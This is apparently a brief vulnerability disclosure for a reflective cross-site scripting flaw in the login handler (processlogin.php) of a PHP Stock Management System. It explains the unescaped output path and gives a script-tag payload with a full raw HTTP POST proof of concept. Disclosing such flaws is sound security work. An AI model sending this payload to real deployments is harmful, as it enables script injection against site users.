| Reflective XSS vulnerability in Stock Management System ``` In processlogin PHP, in lines 18-25 of the code, the parameters entered by the front end are brought into the database for associated table query, and then the results of database execution are returned. After the 27th line of code, judge the results of database execution, and return the output results to the front end, which is shown in the interface. Payload is 1 '<script>alert (1)</script>, that is, after the statement is closed, return it to the front end, and output it on the front end, causing XSS vulnerabilities.  ```  Proof of vulnerability utilization:    POC:  ``` POST /pages/processlogin.php HTTP/1.1 Host: vulscms.test Content-Length: 54 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://vulscms.test Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://vulscms.test/pages/login.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=roq9qu2s58ta48gg165qqke6l9 Connection: close  user=1' <script>alert(1)</script>&password=1&btnlogin=  ``` |
